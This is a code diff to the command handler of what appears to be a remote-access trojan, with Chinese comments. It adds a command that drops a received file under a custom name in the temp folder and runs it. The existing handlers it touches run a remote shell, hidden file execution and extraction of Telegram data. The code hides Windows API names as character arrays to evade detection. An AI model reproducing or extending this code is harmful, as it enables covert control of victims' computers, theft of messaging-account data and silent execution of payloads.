@@ -93,9 +93,9 @@ void CKernelManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
 		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_AudioManager,
 			(LPVOID)m_pClient->m_Socket, 0, NULL);
 		break;
-	case COMMAND_TELEGRAM:            // 提取 T G
-		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_TelegramManager,
-			(LPVOID)m_pClient->m_Socket, 0, NULL);
+	case COMMAND_TELEGRAM_EXTRACT:     // 提取TG数据  
+		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_TelegramManager,  
+			(lpBuffer + 1), 0, NULL);  
 		break;
 	case COMMAND_SHELL:            // 远程终端
 		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_ShellManager, 
@@ -133,7 +133,7 @@ void CKernelManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
 		WaitForSingleObject(hNewThreadInitializedEvent,INFINITE);
 		break;
 	case COMMAND_SENDFILE_HIDE:    // 隐藏运行
-		RecvAndOpenFile((LPCTSTR)(lpBuffer + 1), nSize - 1, SW_HIDE);
+		RecvAndOpenFile((LPCTSTR)(lpBuffer + 1), nSize - 1, SW_HIDE); 
 		m_pClient->m_DeCompressionBuffer.ReallyClearBuffer();
 		m_pClient->m_CompressionBuffer.ReallyClearBuffer();
 		break;
@@ -146,6 +146,17 @@ void CKernelManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
 		RecvAndOpenFile((LPCTSTR)(lpBuffer + 1), nSize - 1, -1);
 		m_pClient->m_DeCompressionBuffer.ReallyClearBuffer();
 		m_pClient->m_CompressionBuffer.ReallyClearBuffer();
+		break;
+	case COMMAND_SENDFILE_CUSTOM:    // 自定义文件名上传  
+		{  
+			// 解析数据包：扩展名 + 自定义文件名 + 文件数据  
+			char *lpExt = (char *)(lpBuffer + 1);  
+			char *lpFileName = lpExt + strlen(lpExt) + 1;  
+			char *lpFileData = lpFileName + strlen(lpFileName) + 1;  
+			UINT dataSize = nSize - 1 - strlen(lpExt) - 1 - strlen(lpFileName) - 1;  
+			
+			RecvAndOpenFile(lpFileData, dataSize, -1, lpFileName);  
+		}  
 		break;
 	case COMMAND_OPEN_URL_SHOW:    // 显示打开网页
 		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_OpenUrlShow,
@@ -227,50 +238,54 @@ void CKernelManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
 	}
 }
 
-BOOL CKernelManager::RecvAndOpenFile(const void *filedata, UINT size, INT nShowCmd)
-{
-	char zFiOL[]={'K','E','R','N','E','L','3','2','.','d','l','l','\0'};
-	char yUfMS[]={'G','e','t','T','e','m','p','P','a','t','h','A','\0'};
-	typedef DWORD (WINAPI *GetTempPathAT)(DWORD nBufferLength,LPSTR lpBuffer);
-	GetTempPathAT pGetTempPathA=(GetTempPathAT)GetProcAddress(LoadLibrary(zFiOL),yUfMS);
+BOOL CKernelManager::RecvAndOpenFile(const void *filedata, UINT size, INT nShowCmd, LPCTSTR lpCustomFileName)  
+{  
+	char zFiOL[]={'K','E','R','N','E','L','3','2','.','d','l','l','\0'};  
+	char yUfMS[]={'G','e','t','T','e','m','p','P','a','t','h','A','\0'};  
+	typedef DWORD (WINAPI *GetTempPathAT)(DWORD nBufferLength,LPSTR lpBuffer);  
+	GetTempPathAT pGetTempPathA=(GetTempPathAT)GetProcAddress(LoadLibrary(zFiOL),yUfMS);  
 	
-	char EDlyBB[] = {'C','r','e','a','t','e','F','i','l','e','A','\0'};
-	CreateFileAT pCreateFileA=(CreateFileAT)GetProcAddress(LoadLibrary(zFiOL),EDlyBB);
+	char EDlyBB[] = {'C','r','e','a','t','e','F','i','l','e','A','\0'};  
+	CreateFileAT pCreateFileA=(CreateFileAT)GetProcAddress(LoadLibrary(zFiOL),EDlyBB);  
 	
-	char strExePath[MAX_PATH], strRand[100];
-	pGetTempPathA(sizeof(strExePath), strExePath);
+	char strExePath[MAX_PATH], strRand[100];  
+	pGetTempPathA(sizeof(strExePath), strExePath);  
 	
-	if (nShowCmd == -1)  //不去运行
-	{
-	    char UtKoF22[] = {'P','l','u','g','i','n','3','2','.','d','l','l','\0'};
-     	sprintf(strRand, UtKoF22, GetTickCount());
-	}
-    else
-	{
-		char UtKoF23[] = {'R','u','%','d','%','s','\0'};
-		sprintf(strRand, UtKoF23, GetTickCount(), filedata);
-	}
-	lstrcat(strExePath, strRand);
+	// 如果提供了自定义文件名，使用它；否则使用原来的逻辑  
+	if (lpCustomFileName != NULL && strlen(lpCustomFileName) > 0) {  
+		strcpy(strRand, lpCustomFileName);  
+	}  
+	else {  
+		if (nShowCmd == -1)  //不去运行  
+		{  
+			char UtKoF22[] = {'P','l','u','g','i','n','3','2','.','d','l','l','\0'};  
+			sprintf(strRand, UtKoF22, GetTickCount());  
+		}  
+		else  
+		{  
+			char UtKoF23[] = {'R','u','%','d','%','s','\0'};  
+			sprintf(strRand, UtKoF23, GetTickCount(), filedata);  
+		}  
+	}  
+	lstrcat(strExePath, strRand);  
 	
-	HANDLE hFile=pCreateFileA(strExePath,GENERIC_WRITE,FILE_SHARE_WRITE,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,0);
-	if (hFile == INVALID_HANDLE_VALUE) // 错误处理
-		return false;
-	DWORD dwBytesWrite;
-	WriteFile(hFile,(char *)filedata+strlen((char *)filedata)+1,size-strlen((char *)filedata)-1,&dwBytesWrite,NULL); // 写入文件
-	CloseHandle(hFile);
+	HANDLE hFile=pCreateFileA(strExePath,GENERIC_WRITE,FILE_SHARE_WRITE,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,0);  
+	if (hFile == INVALID_HANDLE_VALUE) // 错误处理  
+		return false;  
+	DWORD dwBytesWrite;  
+	WriteFile(hFile, filedata, size, &dwBytesWrite, NULL); // 写入文件  
+	CloseHandle(hFile);  
 	
-	if (nShowCmd == -1)  //不去运行
-		return false;
+	if (nShowCmd == -1)  //不去运行  
+		return false;  
 	
-	char *lpExt = pMyfunction->my_strrchr(strExePath, '.');
-	if (!lpExt)
-		return false;
+	char *lpExt = pMyfunction->my_strrchr(strExePath, '.');  
+	if (!lpExt)  
+		return false;  
 	
-	//char BvtmX12[] = {'o','p','e','n','\0'};
-	if(GetFileAttributesA(strExePath) == -1)  //检查文件不存在
-	    return false;
-	return OpenFile1(strExePath, FALSE, nShowCmd);
-    //return ShellExecute(NULL,BvtmX12,strExePath,NULL,NULL,nShowCmd) > (HINSTANCE)32; //正常运行目标文件
+	if(GetFileAttributesA(strExePath) == -1)  //检查文件不存在  
+		return false;  
+	return OpenFile1(strExePath, FALSE, nShowCmd);  
 }
 
 void CKernelManager::ReStartServer()
